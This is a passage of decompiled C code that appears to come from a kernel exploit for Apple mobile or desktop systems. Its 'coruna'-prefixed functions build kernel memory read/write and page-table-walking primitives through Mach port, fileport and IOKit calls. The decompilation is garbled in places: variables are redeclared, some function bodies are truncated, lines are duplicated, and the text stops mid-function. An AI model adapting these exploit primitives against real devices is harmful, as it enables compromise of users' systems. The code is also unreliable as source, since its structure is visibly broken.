    size_3[0x22] = 0;
    size_3[0x25] = 0;
    size_3[0x24] = 0;
    size_3[0x21] = size;
    size_3[0x20] = u;
    size_3[0x26] = k_kernel_rodata_word_2ae50;
    *(uint32_t *)(size_3 + 0x27) = 3;
    u = k_kernel_rodata_word_2ae58;
    *(uint32_t *)(size_3 + 0x41) = 0x22000000;
    size_3[0x42] = u;
    size_3[0x4b] = off_3 + 600;
    size_3[0x4c] = off_3 + 600;
    *(uint32_t *)((long)size_3 + handle + 0x200) = 3;
    *(uint32_t *)(size_3 + 0x5e) = 0x22000000;
    size_3[0x5f] = addr;
    size_3[0x60] = 0;
    size_3[0x61] = addr;
  }
  else {
    version = 0x28007;
  }
  return version;
}





uint64_t coruna_memcpy(uint64_t val,long *handle,long addr_2,long off_3,int flags)
{
  long handle;
  long *ptr;
  
  _memcpy((void *)(addr_2 + 0x200),(void *)(*handle + 0x200),(unsigned long)(flags - 0x200));
  handle = off_3 + (unsigned long)*(uint *)((long)handle + 0x6c) + 0x200;
  ptr = (long *)(addr_2 + 0x200 + (unsigned long)*(uint *)((long)handle + 0x6c));
  *ptr = handle;
  ptr[1] = handle;
  return 0;
}





uint64_t coruna_kernel29478_residual_157(long handle,uint64_t *val,int flags,long addr_2)
{
  uint32_t u;
  uint32_t *ptr;
  long scratch;
  
  ptr = (uint32_t *)val[4];
  if (ptr == (uint32_t *)0x0) {
    ptr = (uint32_t *)*val;
  }
  scratch = addr_2;
  if (addr_2 == 0) {
    scratch = val[1];
  }
  if (flags < 2) {
    if (flags == 0) {
      scratch = 0;
      u = 0x80000000;
    }
    else {
      if (flags != 1) {
        return 0xad001;
      }
      u = 0x80000801;
    }
  }
  else if (flags == 2) {
    scratch = scratch + (unsigned long)(addr_2 == 0) * 0x200;
    u = 0x80000802;
  }
  else {
    if (flags != 0x1c) {
      return 0xad001;
    }
    scratch = scratch + (unsigned long)(addr_2 == 0) * 0x100;
    u = 0x8000081c;
  }
  *ptr = u;
  _memcpy((void *)((long)ptr + (unsigned long)*(uint *)(val + 9)),&scratch,
          (long)*(int *)(handle + 0x168));
  return 0;
}





uint64_t coruna_kernel09_residual_267(long handle,long *addr_2,long off_3)
{
  int err;
  void *ptr;
  long *buf;
  long *str;
  long handle;
  unsigned long u;
  long scratch;
  long bootargs;
  
  buf = &scratch;
  if ((char)addr_2[8] == '\0') {
    if (off_3 == 0) {
      bootargs = 0;
    }
    else {
      bootargs = off_3 - (unsigned long)*(uint *)((long)addr_2 + 100);
    }
    ptr = (void *)(*addr_2 + (unsigned long)*(uint *)((long)addr_2 + 0x5c) + 0x200);
    err = *(int *)(handle + 0x168);
    buf = &bootargs;
  }
  else {
    handle = addr_2[4];
    if (handle == 0) {
      str = addr_2 + 1;
      handle = *addr_2;
    }
    else {
      str = addr_2 + 5;
    }
    err = *(int *)(handle + 0x168);
    u = (unsigned long)(uint)((int)addr_2[9] + err * 2);
    if (off_3 == 0) {
      scratch = 0;
    }
    else {
      buf = &bootargs;
      scratch = (u - (long)err) + *str;
    }
    bootargs = off_3;
    _memcpy((void *)(handle + (unsigned long)(uint)(err * 3 + (int)addr_2[9])),&scratch,(long)err);
    ptr = (void *)(handle + u);
    err = *(int *)(handle + 0x168);
  }
  _memcpy(ptr,buf,(long)err);
  return 0;
}





uint64_t coruna_memcpy_150b4(long handle,long *addr_2,uint64_t val)
{
  long handle;
  uint64_t scratch;
  
  handle = addr_2[4];
  if (handle == 0) {
    handle = *addr_2;
  }
  scratch = val;
  _memcpy((void *)(handle + (unsigned long)*(uint *)((long)addr_2 + 0x44)),&scratch,
          (long)*(int *)(handle + 0x168));
  return 0;
}





uint64_t coruna_memcpy_150fc(long handle,long *addr_2,uint64_t val)
{
  uint64_t scratch;
  
  scratch = val;
  _memcpy((void *)(*addr_2 + 0x110),&scratch,(long)*(int *)(handle + 0x168));
  return 0;
}





uint64_t coruna_memcpy_14fdc(long handle,long *addr_2,uint64_t val)
{
  uint64_t scratch;
  
  scratch = val;
  _memcpy((void *)(*addr_2 + (unsigned long)*(uint *)(addr_2 + 10) + 0x200),&scratch,
          (long)*(int *)(handle + 0x168));
  return 0;
}





uint64_t coruna_memcpy_14fdc_1517c(long handle,long *addr_2,uint64_t val)
{
  uint64_t scratch;
  
  scratch = val;
  _memcpy((void *)(*addr_2 + (unsigned long)*(uint *)(addr_2 + 0xc) + 0x200),&scratch,
          (long)*(int *)(handle + 0x168));
  return 0;
}





uint64_t coruna_memcpy_14fdc_151c0(long handle,long *addr_2,uint64_t val)
{
  uint64_t scratch;
  
  scratch = val;
  _memcpy((void *)(*addr_2 + (unsigned long)*(uint *)(addr_2 + 0xb) + 0x200),&scratch,
          (long)*(int *)(handle + 0x168));
  return 0;
}





uint64_t coruna_ret_stub(uint64_t val,long handle)
{
  *(uint8_t *)(handle + 0x40) = 1;
  return 0;
}





uint64_t coruna_kernel29478_residual_158(uint64_t val,long handle,int flags)
{
  if (1 < flags + 1U) {
    *(int *)(handle + 0x3c) = flags;
    return 0;
  }
  return 0x28008;
}





void coruna_call_helper_18054(uint64_t val)
{
  coruna_kernel09_residual_268(val,1,0);
  return;
}





uint64_t coruna_kernel09_residual_268(uint64_t *val,int flags,unsigned long arg)
{
  bool err;
  unsigned long u;
  int *err;
  long handle;
  uint size;
  
  handle = val[4];
  if (((arg & 1) != 0) || ((flags != 0 && (handle == 0)))) {
    size = 0;
    while (u = _write(*(int *)(val + 3),(void *)*val,(unsigned long)*(uint *)(val + 2)),
          u == 0xffffffffffffffff) {
      err = ___error();
      if (*err != 4) {
        return 0x28009;
      }
      err = 99 < size;
      size = size + 1;
      if (err) {
        return 0x28009;
      }
    }
    if (u >> 0x20 != 0) {
      return 0x28009;
    }
    if (*(int *)(val + 2) != (int)u) {
      return 0x28009;
    }
    u = _read(*(int *)((long)val + 0x14),(void *)*val,u & 0xffffffff);
    if (u == 0xffffffffffffffff) {
      size = 0;
      do {
        err = ___error();
        if (*err != 4) {
          return 0x2800a;
        }
        if (99 < size) {
          return 0x2800a;
        }
        size = size + 1;
        u = _read(*(int *)((long)val + 0x14),(void *)*val,(unsigned long)*(uint *)(val + 2))
        ;
      } while (u == 0xffffffffffffffff);
    }
    if (u >> 0x20 != 0) {
      return 0x2800a;
    }
    if (*(int *)(val + 2) != (int)u) {
      return 0x2800a;
    }
  }
  if (handle != 0 && flags != 0) {
    size = 0;
    while (u = _write(*(int *)(val + 7),(void *)val[4],(unsigned long)*(uint *)(val + 6)),
          u == 0xffffffffffffffff) {
      err = ___error();
      if (*err != 4) {
        return 0x28009;
      }
      err = 99 < size;
      size = size + 1;
      if (err) {
        return 0x28009;
      }
    }
    if (u >> 0x20 != 0) {
      return 0x28009;
    }
    if (*(int *)(val + 6) != (int)u) {
      return 0x28009;
    }
    u = _read(*(int *)((long)val + 0x34),(void *)val[4],u & 0xffffffff);
    if (u == 0xffffffffffffffff) {
      size = 0;
      do {
        err = ___error();
        if ((*err != 4) || (99 < size)) {
          return 0x2800a;
        }
        size = size + 1;
        u = _read(*(int *)((long)val + 0x34),(void *)val[4],
                      (unsigned long)*(uint *)(val + 6));
      } while (u == 0xffffffffffffffff);
    }
    if (u >> 0x20 != 0) {
      return 0x2800a;
    }
    if (*(int *)(val + 6) != (int)u) {
      return 0x2800a;
    }
  }
  return 0;
}





void coruna_call_helper_18054_15430(uint64_t val)
{
  coruna_kernel09_residual_268(val,1,1);
  return;
}





unsigned long coruna_pid_for_task_20c00(uint64_t arg,long val,uint64_t n,int *m)

{
  uint port;
  unsigned long tag;
  int path_buf;
  
  coruna_kernel09_residual_267();
  tag = coruna_kernel09_residual_268(val,0,1);
  if ((int)tag == 0) {
    port = _pid_for_task(*(mach_port_name_t *)(val + 0x3c),&path_buf);
    if (port == 0) {
      *m = path_buf;
      tag = 0;
    }
    else {
      tag = (unsigned long)(port | 0x80000000);
    }
  }
  return tag;
}





unsigned long coruna_mach_port_get_attributes(uint64_t arg,long val,uint64_t n,integer_t *m)

{
  void (*ptr)(void);
  uint tag;
  unsigned long u;
  unsigned long unaff_x30;
  integer_t tmp_buf [2];
  
  if (*(char *)(val + 0x40) != '\0') {
    coruna_kernel09_residual_267(arg,val);
    u = coruna_kernel09_residual_268(val,1,0);
    if ((int)u == 0) {
      tmp_buf[1] = 1;
      tag = _mach_port_get_attributes
                        (*(ipc_space_t *)k_kernel_mach_task_self_slot,
                         *(mach_port_name_t *)(val + 0x3c),3,tmp_buf,
                         (mach_msg_type_number_t *)(tmp_buf + 1));
      if (tag == 0) {
        *m = tmp_buf[0];
        u = 0;
      }
      else {
        u = (unsigned long)(tag | 0x80000000);
      }
    }
    return u;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = coruna_pid_for_task_20c00(arg,val,n,m);
  return u;
}





void coruna_kernel09_via_mach_port_get_attributes(uint64_t val,uint64_t id_2,long handle,uint64_t *size_3)
{
  int err;
  uint32_t scratch;
  uint32_t scratch;
  
  err = coruna_mach_port_get_attributes();
  if ((err == 0) && (err = coruna_mach_port_get_attributes(val,id_2,handle + 4,&scratch), err == 0)) {
    *size_3 = coruna_u64_pack((scratch), (scratch));
  }
  return;
}





uint64_t coruna_kernel29bb0_via_mach_port_get_attributes(uint64_t val,long handle,unsigned long arg,uint size,unsigned long *arg)
{
  uint u;
  unsigned long size;
  int err;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  uint64_t kind;
  unsigned long type_id;
  uint64_t type_id_8;
  unsigned long type_id_9;
  uint scratch;
  
  type_id_8 = 0x2800c;
  version = coruna_return_zero_2b2d0();
  if ((int)version == 0) {
    type_id_8 = 0x2800b;
  }
  else if (arg == 0) {
    type_id_8 = 0x28008;
  }
  else {
    port = coruna_kernel29bb0_residual_168(val,version,version);
    tag = coruna_kernel29bb0_residual_169(val,arg,version,port);
    if (tag == 0) {
      type_id_8 = 0x28026;
    }
    else {
      for (type_id_9 = arg; tag <= type_id_9; type_id_9 = type_id_9 - (version & 0xffffffff)) {
        if (handle == 0) {
          err = coruna_kernel29bb0_via_ioconnectcallmethod(val,type_id_9,&scratch);
          if (err != 1) {
            return 0x2800f;
          }
        }
        else {
          kind = coruna_mach_port_get_attributes(val,handle,type_id_9,&scratch);
          if ((int)kind != 0) {
            return kind;
          }
        }
        u = scratch & 0x3ff;
        *arg = type_id_9;
        return 0;
      }
      type_id_9 = arg;
      do {
        do {
          type_id_9 = (version & 0xffffffff) + type_id_9;
          if (((port & 0xffffffff) - (version & 0xffffffff)) + tag < type_id_9) {
            return 0x2800c;
          }
          if (handle == 0) {
            err = coruna_kernel29bb0_via_ioconnectcallmethod(val,type_id_9,&scratch);
            if (err != 1) {
              return 0x2800f;
            }
          }
          else {
            kind = coruna_mach_port_get_attributes(val,handle,type_id_9,&scratch);
            if ((int)kind != 0) {
              return kind;
            }
          }
          u = scratch & 0x3ff;
          if (u == size) {
fail:
            *arg = type_id_9;
            return 0;
          }
        } while (u == 0x11);
        size = 0;
        do {
          type_id = size;
          if (type_id == 9) break;
          size = type_id + 1;
        } while ((&k_kernel_rodata_word_2ae84)[type_id] != u);
      } while (type_id < 9);
    }
  }
  return type_id_8;
}





void coruna_kernel29bb0_via_kernel29bb0_via_mach_port_get_attributes(void)
{
  coruna_kernel29bb0_via_mach_port_get_attributes();
  return;
}





uint coruna_fileport_makeport_1580c(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  int *err;
  uint *ptr;
  long handle;
  uint u;
  int scratch;
  mach_port_name_t bootargs;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  
  u = 0x2800f;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0x28007;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return 0x28007;
  }
  err = _fileport_makeport(val,&bootargs);
  if (err != 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    return u | 0x40000000;
  }
  handle = coruna_kernel29bb0_via_return_zero_1f078(handle,bootargs);
  if (handle == 0) {
    u = 0x28025;
  }
  else {
    err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x28,&serial_buf);
    if ((err != 0) && (err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,serial_buf,&scratch), err != 0)) {
      if (scratch == 6) {
        err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x38,&host_info);
        if (err != 0) {
          handle = coruna_ptr_canonicalize(handle,host_info);
          if (handle != 0) {
            err = coruna_kernel29bb0_trampoline_0001a670(handle,host_info + 0x10,&thread_attr);
            _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
            return u;
          }
          u = 0x28026;
        }
      }
      else {
        u = 0x28011;
      }
    }
  }
code_r0x00015980:
  _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
  return u;
}





void coruna_mach_absolute_time(long handle)
{
  uint64_t *ptr;
  unsigned long u;
  uint64_t size;
  long handle;
  
  handle = *(long *)(handle + 0x868);
  size = _mach_absolute_time();
  if (handle != 0) {
    u = 0;
    if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
      u = ((size - *(long *)(handle + 0x868)) * (unsigned long)*(uint *)(handle + 0x25c)) /
              (unsigned long)*(uint *)(handle + 0x260);
    }
    if (u < 0x12a153440) {
      return;
    }
    handle = 0;
    do {
      ptr = (uint64_t *)(handle + 0x5e8 + handle);
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      handle = handle + 0x28;
    } while (handle != 0x280);
    size = _mach_absolute_time();
  }
  *(uint64_t *)(handle + 0x868) = size;
  return;
}





void coruna_kernel29bb0_via_return_zero_20958(uint64_t val)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_20958(val,handle);
  return;
}





uint64_t coruna_kernel29bb0_via_return_zero_30860(long handle,unsigned long arg,long *addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint32_t size;
  uint8_t version;
  uint port;
  unsigned long tag;
  long addr;
  uint64_t kind;
  long off;
  long base;
  uint64_t scratch;
  unsigned long bootargs;
  
  u = 0;
  if (addr_2 != (long *)0x0) {
    addr = 0;
    addr_2[4] = 0;
    addr_2[1] = 0;
    *addr_2 = 0;
    addr_2[3] = 0;
    addr_2[2] = 0;
    do {
      handle = *(long *)(handle + addr + 0x5e8);
      if (handle == 0) break;
      tag = *(unsigned long *)(handle + addr + 0x5f0);
      if ((tag <= arg) && (arg < tag + *(uint *)(handle + addr + 0x5f8))) {
        err = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,handle,8,handle + addr + 0x608,val);
        if (err != 0) {
          handle = handle + addr;
          handle = *(long *)(handle + 0x5f0);
          addr = *(long *)(handle + 0x5e8);
          base = *(long *)(handle + 0x600);
          off = *(long *)(handle + 0x5f8);
          addr_2[4] = *(long *)(handle + 0x608);
          addr_2[1] = handle;
          *addr_2 = addr;
          addr_2[3] = base;
          addr_2[2] = off;
          return 1;
        }
        break;
      }
      addr = addr + 0x28;
    } while (addr != 0x280);
    if (*(long *)(handle + 0x5d0) == 0) {
      addr = coruna_kernel29bb0_via_return_zero_20958(handle);
      if (((addr == 0) || (err = coruna_kernel29bb0_trampoline_0001a670(handle,addr,&bootargs), err == 0)) ||
         (err = coruna_kernel29bb0_trampoline_0001a670(handle,addr + *(int *)(handle + 0x168),&scratch),
         err == 0)) return 0;
      size = 0x200;
      if (*(int *)(handle + 0x180) != 0x1000) {
        size = 0x800;
      }
      *(unsigned long *)(handle + 0x5d0) = bootargs;
      *(uint64_t *)(handle + 0x5d8) = scratch;
      *(uint32_t *)(handle + 0x5e0) = size;
      coruna_return_zero_23190(handle);
    }
    if ((*(int *)(handle + 0x180) == 0x1000) || (err = coruna_ctx_test_flag(handle,0x8000), err != 0))
    {
      handle = *(long *)(handle + 0x5d0);
      kind = *(uint64_t *)(handle + 0x5d8);
      addr = coruna_return_zero_30860(handle,handle,kind,kind);
      tag = arg >> 0x1b & 0x7f8;
      u = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,handle + tag,8,&bootargs,val);
      if ((int)u != 0) {
        if ((bootargs & 3) == 0) return 0;
        if ((bootargs & 3) == 1) {
          addr = addr + tag;
          size = 0x40000000;
          tag = 0xffffffffc0000000;
          version = 1;
        }
        else {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
          addr = coruna_return_zero_30860(handle,handle,kind,bootargs & 0xfffffffff000);
          addr = addr + (arg >> 0x12 & 0xff8);
          u = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,addr,8,&bootargs,val);
          if ((int)u == 0) return 0;
          if ((bootargs & 3) == 0) return 0;
          if ((bootargs & 3) == 1) {
            size = 0x200000;
            tag = 0xffffffffffe00000;
            version = 1;
          }
          else {
            if ((bootargs >> 0x3b & 1) != 0) {
              *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
            }
            addr = coruna_return_zero_30860(handle,handle,kind,bootargs & 0xfffffffff000);
            addr = addr + (arg >> 9 & 0xff8);
            u = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,addr,8,&bootargs,val);
            if ((int)u == 0) return 0;
            if ((~(uint)bootargs & 3) != 0) return 0;
            version = 3;
            size = 0x1000;
            tag = 0xfffffffffffff000;
          }
        }
        *addr_2 = addr;
        addr_2[1] = tag & arg;
        *(uint32_t *)(addr_2 + 2) = size;
        *(uint8_t *)((long)addr_2 + 0x14) = version;
        addr_2[4] = bootargs;
        port = 3;
        if ((bootargs & 0x80) != 0) {
          port = 1;
        }
        *(uint *)(addr_2 + 3) = ((uint)(bootargs >> 0x33) & 4 | port) ^ 4;
        u = 1;
      }
    }
    else {
      if (*(int *)(handle + 0x180) != 0x4000) return 0;
      addr = *(long *)(handle + 0x5d0);
      kind = *(uint64_t *)(handle + 0x5d8);
      err = coruna_ctx_test_flag(handle,0x5000008);
      tag = 7;
      if (err != 0) {
        tag = 0x7ff;
      }
      u = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,addr + (tag & arg >> 0x24) * 8,8,&bootargs,val);
      if ((int)u != 0) {
        if ((~(uint)bootargs & 3) == 0) {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
          handle = coruna_return_zero_30860(handle,addr,kind,bootargs & 0xffffffffc000);
          handle = handle + (arg >> 0x16 & 0x3ff8);
          u = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,handle,8,&bootargs,val);
          if ((int)u == 0) return 0;
          if ((bootargs & 3) != 0) {
            if ((bootargs & 3) == 1) {
              size = 0x2000000;
              tag = 0xfffffffffe000000;
              version = 1;
            }
            else {
              if ((bootargs >> 0x3b & 1) != 0) {
                *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
              }
              handle = coruna_return_zero_30860(handle,addr,kind,bootargs & 0xffffffffc000);
              handle = handle + (arg >> 0xb & 0x3ff8);
              u = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,handle,8,&bootargs,val);
              if ((int)u == 0) return 0;
              if ((~(uint)bootargs & 3) != 0) return 0;
              version = 3;
              size = 0x4000;
              tag = 0xffffffffffffc000;
            }
            *addr_2 = handle;
        *addr_2 = addr;
        addr_2[1] = tag & arg;
        *(uint32_t *)(addr_2 + 2) = size;
        *(uint8_t *)((long)addr_2 + 0x14) = version;
        addr_2[4] = bootargs;
        port = 3;
        if ((bootargs & 0x80) != 0) {
          port = 1;
        }
        *(uint *)(addr_2 + 3) = ((uint)(bootargs >> 0x33) & 4 | port) ^ 4;
        u = 1;
          }
        }
      }
    }
cleanup:
    if ((int)u != 0) {
      addr = 0;
      do {
        if (*(long *)(handle + 0x5e8 + addr) == 0) {
          handle = handle + addr;
          handle = addr_2[1];
          addr = *addr_2;
          base = addr_2[3];
          off = addr_2[2];
          *(long *)(handle + 0x608) = addr_2[4];
          *(long *)(handle + 0x5f0) = handle;
          *(long *)(handle + 0x5e8) = addr;
          *(long *)(handle + 0x600) = base;
          *(long *)(handle + 0x5f8) = off;
          return u;
        }
        addr = addr + 0x28;
      } while (addr != 0x280);
    }
  }
  return u;
}





void coruna_call_mach_vm_machine_attribute_29df8_15ee8(void)
{
  coruna_kernel29bb0_via_return_zero_30860();
  return;
}





uint64_t coruna_slab_lookup_fast(uint64_t val,uint64_t *id_2)
{
  if (id_2 != (uint64_t *)0x0) {
    if ((void *)id_2[3] != (void *)0x0) {
      _free((void *)id_2[3]);
    }
    id_2[1] = 0;
    *id_2 = 0;
    id_2[3] = 0;
    id_2[2] = 0;
    _free(id_2);
    return 0;
  }
  return 0xad001;
}
int coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_2(long handle,uint64_t *val)
{
  char *ptr;
  uint u;
  int err;
  uint size;
  unsigned long *ptr;
  int status;
  int flags;
  unsigned long *buf;
  unsigned long *str;
  unsigned long *copy;
  long handle;
  unsigned long version;
  uint64_t port;
  unsigned long *data;
  unsigned long tag;
  unsigned long kind;
  unsigned long *obj;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  long host_info;
  unsigned long serial_buf;
  long action;
  long block_ctx;
  uint32_t scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  uint32_t host_info;
  uint32_t serial_buf;
  uint stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  flags = 0xad009;
  buf = _calloc(0x20,1);
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
  return flags;
  }
  ___stack_chk_fail();
}





bool coruna_modinfo_string_match(uint64_t val,long handle,void *ctx,uint size)
{
  int err;
  bool err;
  int status;
  unsigned long u;
  long handle;
  unsigned long size;
  
  if ((((handle == 0) || (handle = *(long *)(handle + 0x18), handle == 0)) ||
      (u = (unsigned long)*(uint *)(handle + 0x10), *(uint *)(handle + 0x10) == 0)) ||
     (*(uint *)(handle + 8) != size)) {
    err = false;
  }
  else {
    size = 0;
    err = *(int *)(handle + 0xc);
    do {
      u = u - 1;
      status = _memcmp((void *)(handle + size),ctx,(unsigned long)size);
      err = status == 0;
      size = (unsigned long)((int)size + err + size);
    } while (status != 0 && u != 0);
  }
  return err;
}





uint64_t coruna_qsort(uint64_t val,long handle,void *ctx,unsigned long arg)
{
  int err;
  int status;
  uint u;
  unsigned long size;
  int *err;
  uint64_t version;
  void *ptr;
  long handle;
  
  version = 0xad001;
  if (((handle != 0) && (handle = *(long *)(handle + 0x18), handle != 0)) &&
     (*(int *)(handle + 8) == (int)arg)) {
    size = coruna_modinfo_string_match(val,handle,ctx,arg);
    if ((size & 1) == 0) {
      if (0x3ff < *(uint *)(handle + 0x10)) {
        return 0xad00c;
      }
      ptr = (void *)(handle + (unsigned long)((*(int *)(handle + 0xc) + (int)arg) *
                                       *(uint *)(handle + 0x10)));
      _memcpy(ptr,ctx,arg & 0xffffffff);
      *(int *)(handle + 0x10) = *(int *)(handle + 0x10) + 1;
      if (*(int *)(handle + 0xc) == 2) {
        *(uint8_t *)((long)ptr + (unsigned long)*(uint *)(handle + 8)) = 2;
        *(uint8_t *)((long)ptr + (unsigned long)(*(int *)(handle + 8) + 1)) = 0;
      }
      ptr = *(void **)(handle + 0x18);
      if (ptr == (void *)0x0) {
        return 0xad001;
      }
      u = *(uint *)(handle + 0x10);
      if (u == 0) {
        return 0;
      }
      err = *(int *)(handle + 8);
      status = *(int *)(handle + 0xc);
      err = (int *)coruna_fn_ptr_cast(coruna_return_zero_18ea0);
      _qsort(ptr,(unsigned long)u,(unsigned long)(uint)(status + err),err);
    }
    version = 0;
  }
  return version;
}





uint32_t coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94(uint64_t val,long *handle)
{
  int err;
  uint32_t u;
  
  u = 0xad001;
  if (((handle != (long *)0x0) && (handle[3] != 0)) && (*handle != 0)) {
    err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(val,*handle + 0x30,handle[3],
                         (*(int *)((long)handle + 0xc) + (int)handle[1]) * (int)handle[2]);
    u = 0x28010;
    if ((err != 0) &&
       (err = coruna_mach_vm_machine_attribute(val,*handle + 0x2c,(int)handle[2]), u = 0x28010, err != 0))
    {
      u = 0;
    }
  }
  return u;
}





bool coruna_kernel29bb0_via_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94(uint64_t val,uint size,int flags,long handle)
{
  uint64_t u;
  uint64_t size;
  int err;
  unsigned long version;
  uint64_t scratch;
  
  scratch = 0;
  if (flags == 0x14) {
    size = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_2(val,&scratch);
    u = scratch;
    err = (int)size;
    if (err == 0) {
      if (size != 0) {
        version = 0;
        do {
          size = coruna_qsort(size,u,handle + (version & 0xfffffffc),0x14);
          if ((int)size != 0) goto fail;
          version = version + 0x14;
        } while ((unsigned long)size * 0x14 - version != 0);
      }
      size = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94(val,u);
fail:
      err = (int)size;
      coruna_slab_lookup_fast(size,u);
    }
  }
  else {
    err = 0xad001;
  }
  return err == 0;
}





void coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa9(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_kernel29bb0_via_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94(val,1,size_3,id_2);
  return;
}





uint64_t coruna_return_zero_18ea0(long handle,long addr_2)
{
  long handle;
  
  handle = 0;
  while( true ) {
    if (*(byte *)(handle + handle) < *(byte *)(addr_2 + handle)) {
      return 0xffffffff;
    }
    if (*(byte *)(addr_2 + handle) < *(byte *)(handle + handle)) break;
    handle = handle + 1;
    if (handle == 0x14) {
      return 0;
    }
  }
  return 1;
}





uint64_t coruna_read_boot_manifest_hash(uint64_t *val,uint size)
{
  byte err;
  uint u;
  uint64_t size;
  long handle;
  long addr;
  long off;
  long base;
  unsigned long version;
  byte *ptr;
  char *ptr;
  uint64_t port;
  char scratch [776];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0x2e8] = '\0';
  scratch[0x2e9] = '\0';
  scratch[0x2ea] = '\0';
  scratch[0x2eb] = '\0';
  scratch[0x2ec] = '\0';
  scratch[0x2ed] = '\0';
  scratch[0x2ee] = '\0';
  scratch[0x2ef] = '\0';
  scratch[0x2e0] = '\0';
  scratch[0x2e1] = '\0';
  scratch[0x2e2] = '\0';
  scratch[0x2e3] = '\0';
  scratch[0x2e4] = '\0';
  scratch[0x2e5] = '\0';
  scratch[0x2e6] = '\0';
  scratch[0x2e7] = '\0';
  scratch[0x2f8] = '\0';
  scratch[0x2f9] = '\0';
  scratch[0x2fa] = '\0';
  scratch[0x2fb] = '\0';
  scratch[0x2fc] = '\0';
  scratch[0x2fd] = '\0';
  scratch[0x2fe] = '\0';
  scratch[0x2ff] = '\0';
  scratch[0x2f0] = '\0';
  scratch[0x2f1] = '\0';
  scratch[0x2f2] = '\0';
  scratch[0x2f3] = '\0';
  scratch[0x2f4] = '\0';
  scratch[0x2f5] = '\0';
  scratch[0x2f6] = '\0';
  scratch[0x2f7] = '\0';
  scratch[0x2c8] = '\0';
  scratch[0x2c9] = '\0';
  scratch[0x2ca] = '\0';
  scratch[0x2cb] = '\0';
  scratch[0x2cc] = '\0';
  scratch[0x2cd] = '\0';
  scratch[0x2ce] = '\0';
  scratch[0x2cf] = '\0';
  scratch[0x2c0] = '\0';
  scratch[0x2c1] = '\0';
  scratch[0x2c2] = '\0';
  scratch[0x2c3] = '\0';
  scratch[0x2c4] = '\0';
  scratch[0x2c5] = '\0';
  scratch[0x2c6] = '\0';
  scratch[0x2c7] = '\0';
  scratch[0x2d8] = '\0';
  scratch[0x2d9] = '\0';
  scratch[0x2da] = '\0';
  scratch[0x2db] = '\0';
  scratch[0x2dc] = '\0';
  scratch[0x2dd] = '\0';
  scratch[0x2de] = '\0';
  scratch[0x2df] = '\0';
  scratch[0x2d0] = '\0';
  scratch[0x2d1] = '\0';
  scratch[0x2d2] = '\0';
  scratch[0x2d3] = '\0';
  scratch[0x2d4] = '\0';
  scratch[0x2d5] = '\0';
  scratch[0x2d6] = '\0';
  scratch[0x2d7] = '\0';
  scratch[0x2a8] = '\0';
  scratch[0x2a9] = '\0';
  scratch[0x2aa] = '\0';
  scratch[0x2ab] = '\0';
  scratch[0x2ac] = '\0';
  scratch[0x2ad] = '\0';
  scratch[0x2ae] = '\0';
  scratch[0x2af] = '\0';
  scratch[0x2a0] = '\0';
  scratch[0x2a1] = '\0';
  scratch[0x2a2] = '\0';
  scratch[0x2a3] = '\0';
  scratch[0x2a4] = '\0';
  scratch[0x2a5] = '\0';
  scratch[0x2a6] = '\0';
  scratch[0x2a7] = '\0';
  scratch[0x2b8] = '\0';
  scratch[0x2b9] = '\0';
  scratch[0x2ba] = '\0';
  scratch[699] = '\0';
  scratch[700] = '\0';
  scratch[0x2bd] = '\0';
  scratch[0x2be] = '\0';
  scratch[0x2bf] = '\0';
  scratch[0x2b0] = '\0';
  scratch[0x2b1] = '\0';
